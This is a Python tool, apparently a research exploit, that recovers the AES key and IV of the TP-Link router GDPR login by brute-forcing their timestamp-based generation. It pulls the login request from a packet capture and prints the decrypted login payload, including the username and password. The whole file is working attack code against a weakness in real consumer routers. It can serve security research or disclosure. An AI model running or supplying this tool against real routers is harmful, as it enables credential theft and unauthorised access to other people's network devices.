#!/usr/bin/env python3
"""Recover/verify the TP-Link GDPR login AES key/IV from a captured request.

The GDPR login AES key and IV are generated client-side as
`<unix_ms(13 digits)><3 random digits>` (16 ASCII chars each). The first
ciphertext block therefore decrypts (ECB-style) to `plaintext_block1 XOR IV`,
which lets us recover the IV from a *known plaintext* prefix and brute-force the
3 unknown digits once we know the capture timestamp.

Two dialects:
  * gdpr-text : plaintext starts with the fixed prefix `8\\r\\n[/cgi/login#0`
    (no credentials needed to know the prefix).
  * gdpr-json : plaintext is the JSON `{"data":{"UserName":<b64>,...}}`; pass
    --user/--password so the first block can be derived.

Usage:
  # From a live capture (scapy optional; otherwise paste sign/data):
  python3 crack_login.py --pcap capture.pcap --epoch 1717180000
  python3 crack_login.py --sign <HEX|B64> --data <B64> --epoch 1717180000
  python3 crack_login.py --sign ... --data ... --epoch ... --dialect gdpr-json \\
                         --user user --password <REDACTED>
"""

import argparse
import base64
import binascii
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

KNOWN_PT_TEXT = b"8\r\n[/cgi/login#0"  # gdpr-text / 0xf15h prefix


def xor(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def aes_ecb_decrypt(key: bytes, block: bytes) -> bytes:
    c = Cipher(algorithms.AES(key), modes.ECB())
    d = c.decryptor()
    return d.update(block) + d.finalize()


def aes_cbc_decrypt(key: bytes, iv: bytes, data: bytes) -> bytes:
    c = Cipher(algorithms.AES(key), modes.CBC(iv))
    d = c.decryptor()
    pt = d.update(data) + d.finalize()
    pad = pt[-1]
    return pt[:-pad] if 0 < pad <= 16 else pt


def known_plaintext(dialect, user=None, password=None) -> bytes:
    if dialect == "gdpr-text":
        return KNOWN_PT_TEXT
    # gdpr-json: first 16 bytes of the login JSON payload
    u = base64.b64encode(user.encode()).decode()
    p = base64.b64encode(password.encode()).decode()
    payload = (f'{{"data":{{"UserName":"{u}","Passwd":"{p}","Action":"1",'
               f'"stack":"0,0,0,0,0,0","pstack":"0,0,0,0,0,0"}},'
               f'"operation":"cgi","oid":"/cgi/login"}}')
    return payload.encode()[:16]


def crack(data_b64: str, epoch_secs: int, dialect: str,
          user=None, password=None):
    try:
        raw = base64.b64decode(data_b64)
    except binascii.Error as e:
        print(f"[-] bad base64 data: {e}", file=sys.stderr)
        return None

    first_block = raw[:16]
    p1 = known_plaintext(dialect, user, password)
    if len(p1) < 16:
        p1 = p1 + b"\x00" * (16 - len(p1))
    epoch_s = str(epoch_secs).encode()

    for ms in range(1000):
        for h in range(10):
            for t in range(10):
                for o in range(10):
                    key = f"{epoch_secs}{ms:03d}{h}{t}{o}".encode()[:16]
                    if len(key) < 16:
                        continue
                    dec = aes_ecb_decrypt(key, first_block)
                    iv = xor(dec, p1)
                    if iv[:10] == epoch_s:
                        # Confirm by fully decrypting
                        try:
                            pt = aes_cbc_decrypt(key, iv, raw)
                        except Exception:
                            continue
                        if pt[:len(p1)].rstrip(b"\x00") == p1.rstrip(b"\x00"):
                            return key, iv, pt
    return None


def extract_from_pcap(pcap_path, epoch_hint=None):
    try:
        from scapy.all import rdpcap, IP, TCP
    except ImportError:
        print("[-] scapy not installed; pass --sign/--data directly.",
              file=sys.stderr)
        return None, None
    pkts = rdpcap(pcap_path)
    for pkt in pkts:
        try:
            payload = bytes(pkt[TCP].payload)
        except Exception:
            continue
        if b"/cgi_gdpr" not in payload:
            continue
        import re
        m = re.search(rb"sign=([A-Za-z0-9=+/]+)", payload)
        d = re.search(rb"data=([A-Za-z0-9=+/]+)", payload)
        if m and d and len(m.group(1)) >= 128 and len(d.group(1)) > 64:
            return m.group(1).decode(), d.group(1).decode()
    return None, None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--pcap")
    ap.add_argument("--sign")
    ap.add_argument("--data")
    ap.add_argument("--epoch", type=int,
                    help="Unix epoch SECONDS of the captured login request")
    ap.add_argument("--dialect", choices=["gdpr-text", "gdpr-json"],
                    default="gdpr-text")
    ap.add_argument("--user")
    ap.add_argument("--password")
    args = ap.parse_args()

    sign, data = args.sign, args.data
    if args.pcap and (not sign or not data):
        sign, data = extract_from_pcap(args.pcap)

    if not data:
        print("[-] provide --data (and --sign) or a --pcap", file=sys.stderr)
        sys.exit(1)
    if not args.epoch:
        print("[-] provide --epoch (capture time, seconds)", file=sys.stderr)
        sys.exit(1)
    if args.dialect == "gdpr-json" and not (args.user and args.password):
        print("[-] gdpr-json needs --user and --password", file=sys.stderr)
        sys.exit(1)

    print(f"[*] cracking login AES key/IV (dialect={args.dialect}) ...")
    res = crack(data, args.epoch, args.dialect, args.user, args.password)
    if not res:
        print("[-] could not recover key/IV. Check --epoch and --dialect.")
        sys.exit(1)
    key, iv, pt = res
    print(f"[+] AES Key : {key.decode()}")
    print(f"[+] AES IV  : {iv.decode()}")
    print(f"[+] Sign    : {sign}")
    print("[+] Decrypted login payload:")
    print(pt.decode("utf-8", "replace"))


if __name__ == "__main__":
    main()
